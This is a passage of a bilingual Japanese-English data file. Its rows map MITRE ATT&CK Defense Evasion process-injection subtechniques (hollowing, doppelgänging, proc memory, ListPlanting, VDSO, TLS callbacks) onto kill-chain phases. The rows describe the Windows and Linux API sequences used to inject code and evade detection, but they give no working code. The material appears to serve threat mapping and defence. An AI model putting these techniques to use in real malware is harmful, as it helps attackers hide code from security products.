注入されたプロセスは注入元のプロセスから生成された（したがってセキュリティコンテキストを継承する）ため、この動作によって権限が昇格される可能性は低いでしょう。ただし、プロセスドッペルゲンギングによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性があります。","Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process.

Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)

Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)

Adversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging Dec 2017)

Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):

* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.
* Load – Create a shared section of memory and load the malicious executable.
* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.
* Animate – Create a process from the tainted section of memory and initiate execution.

This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1055,プロセスインジェクション,Process Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

プロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。

より高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。","Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",T1055.012,プロセスハロウイング,Process Hollowing,"攻撃者は、プロセスベースの防御を回避するために、中断され空洞化されたプロセスに悪意のあるコードを注入する可能性があります。プロセスハロウイングは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。

プロセスハロウイングは通常、プロセスを中断状態で作成し、そのメモリをアンマップ/空洞化し、その後悪意のあるコードに置き換えることによって実行されます。被害者プロセスは、プロセスのプライマリスレッドを中断するフラグを含む<code>CreateProcess</code>などのネイティブWindows API呼び出しで作成できます。この時点で、プロセスは<code>ZwUnmapViewOfSection</code>や<code>NtUnmapViewOfSection</code>などのAPI呼び出しを使用してアンマップされた後、書き込まれ、注入されたコードに再配置され、それぞれ<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code>SetThreadContext</code>、そして<code>ResumeThread</code>を介して再開されます。(引用: Leitch Hollowing)(引用: Elastic Process Injection July 2017)

これは[スレッドローカルストレージ](https://attack.mitre.org/techniques/T1055/005)と非常によく似ていますが、既存のプロセスをターゲットにするのではなく、新しいプロセスを作成します。注入されたプロセスは注入元のプロセスから生成された（したがってセキュリティコンテキストを継承する）ため、この動作によって権限が昇格される可能性は低いでしょう。ただし、プロセスハロウイングによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。","Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.

Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)

This is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1055,プロセスインジェクション,Process Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

プロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。

より高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。","Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",T1055.009,Procメモリ,Proc Memory,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、/procファイルシステムを介してプロセスに悪意のあるコードを注入する可能性があります。Procメモリインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。

Procメモリインジェクションは、/procファイルシステム（<code>/proc/[pid]</code>）を介してプロセスのメモリを列挙し、利用可能なガジェット/命令でリターン指向プログラミング（ROP）ペイロードを作成することを含みます。実行中の各プロセスには、メモリマッピングを含む独自のディレクトリがあります。Procメモリインジェクションは、通常、/procファイルシステムによって提供されるメモリマッピングを使用してターゲットプロセスのスタックを上書きすることによって実行されます。この情報は、アドレス空間配置のランダム化（ASLR）などのプロセスメモリ保護によって隠されているオフセット（スタックを含む）やガジェット（悪意のあるペイロードを構築するために使用できるプログラム内の命令）を列挙するために使用できます。列挙されると、<code>/proc/[pid]/maps</code>内のターゲットプロセスのメモリマップはddを使用して上書きできます。(引用: Uninformed Needle)(引用: GDS Linux Injection)(引用: DD Man)

[ダイナミックリンカーハイジャック](https://attack.mitre.org/techniques/T1574/006)などの他のテクニックを使用して、ターゲットプロセスにより多くの利用可能なガジェットを投入することができます。[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)と同様に、procメモリインジェクションは子プロセス（バックグラウンドで実行されているsleepのコピーなど）をターゲットにする場合があります。(引用: GDS Linux Injection)

別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。procメモリインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。","Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.

Proc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man)

Other techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1055,プロセスインジェクション,Process Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

プロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。

より高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。","Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",T1055.015,リストプランティング,ListPlanting,"攻撃者は、リストビューコントロールを悪用して、乗っ取ったプロセスに悪意のあるコードを注入し、プロセスベースの防御を回避したり、権限を昇格させたりする可能性があります。ListPlantingは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。(引用: Hexacorn Listplanting) ListPlanting経由で実行されるコードは、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

リストビューコントロールは、アイテムのコレクションを表示するために使用されるユーザーインターフェイスウィンドウです。(引用: Microsoft List View Controls) アプリケーションのリストビュー設定に関する情報は、プロセスのメモリ内の<code>SysListView32</code>コントロールに保存されます。

ListPlanting（メッセージパッシング「シャッター攻撃」の一形態）は、リストビューコントロールを使用するプロセスの仮想アドレス空間にコードをコピーし、そのコードをリストされたアイテムのソート用のカスタムコールバックとして使用することによって実行される場合があります。(引用: Modexp Windows Process Injection) 攻撃者はまず、ターゲットプロセスのメモリス空間にコードをコピーする必要があります。これは、被害者プロセスウィンドウの<code>SysListView32</code>の子へのハンドルを直接取得する（<code>FindWindow</code>や<code>EnumWindows</code>などのWindows API呼び出しを介して）か、他の[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)メソッドを含むさまざまな方法で実行できます。

ListPlantingのいくつかのバリエーションでは、ターゲットプロセスにメモリを割り当てた後、ウィンドウメッセージを使用してペイロードをコピーし、監視の厳しい<code>WriteProcessMemory</code>関数の使用を回避する場合があります。例えば、攻撃者は<code>PostMessage</code>や<code>SendMessage</code> API関数を使用して<code>LVM_SETITEMPOSITION</code>および<code>LVM_GETITEMPOSITION</code>メッセージを送信し、ペイロードを一度に2バイトずつ割り当てられたメモリに効果的にコピーすることができます。(引用: ESET InvisiMole June 2020)

最後に、ペイロードは、プロセスウィンドウの<code>SysListView32</code>の子に<code>LVM_SORTITEMS</code>メッセージを送信することによってトリガーされ、新しく割り当てられたバッファ内のペイロードが<code>ListView_SortItems</code>コールバックとして渡されて実行されます。","Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process.(Citation: Hexacorn Listplanting) Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.

List-view controls are user interface windows used to display collections of items.(Citation: Microsoft List View Controls) Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.

ListPlanting (a form of message-passing \""shatter attack\"") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.(Citation: Modexp Windows Process Injection) Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.

Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory.(Citation: ESET InvisiMole June 2020)

Finally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1055,プロセスインジェクション,Process Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

プロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。

より高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。","Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",T1055.014,VDSOハイジャック,VDSO Hijacking,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、VDSOハイジャックを介してプロセスに悪意のあるコードを注入する可能性があります。仮想動的共有オブジェクト（vdso）ハイジャックは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。

VDSOハイジャックは、動的にリンクされた共有ライブラリへの呼び出しをリダイレクトすることを含みます。メモリ保護により、[Ptraceシステムコール](https://attack.mitre.org/techniques/T1055/008)を介してプロセスに実行可能コードを書き込むことが妨げられる場合があります。ただし、攻撃者はvdso共有オブジェクトからプロセスにマップされたsyscallインターフェイスコードスタブをハイジャックして、悪意のある共有オブジェクトを開いてマップするためのsyscallを実行する可能性があります。このコードは、プロセスのグローバルオフセットテーブル（マップされたライブラリ関数の絶対アドレスを格納）に格納されているパッチ適用済みのメモリアドレス参照を介してプロセスの実行フローをリダイレクトすることによって呼び出すことができます。(引用: ELF Injection May 2009)(引用: Backtrace VDSO)(引用: VDSO Aug 2005)(引用: Syscall 2014)

別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。VDSOハイジャックによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。","Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process.

VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1055,プロセスインジェクション,Process Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

プロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。

より高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。","Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",T1055.005,スレッドローカルストレージ,Thread Local Storage,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、スレッドローカルストレージ（TLS）コールバックを介してプロセスに悪意のあるコードを注入する可能性があります。TLSコールバックインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。

TLSコールバックインジェクションは、ポータブル実行可能ファイル（PE）内のポインタを操作して、コードの正当なエントリポイントに到達する前にプロセスを悪意のあるコードにリダイレクトすることを含みます。TLSコールバックは通常、スレッドが使用するデータのセットアップやクリーンアップのためにOSによって使用されます。TLSコールバックの操作は、[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)などの他の[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)テクニックを使用して、プロセスのメモリス空間内の特定のオフセットに割り当てて書き込むことによって実行される場合があります。(引用: FireEye TLS Nov 2017)

別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。TLSコールバックインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。","Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.

TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1055,プロセスインジェクション,Process Injection,"攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。

プロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。

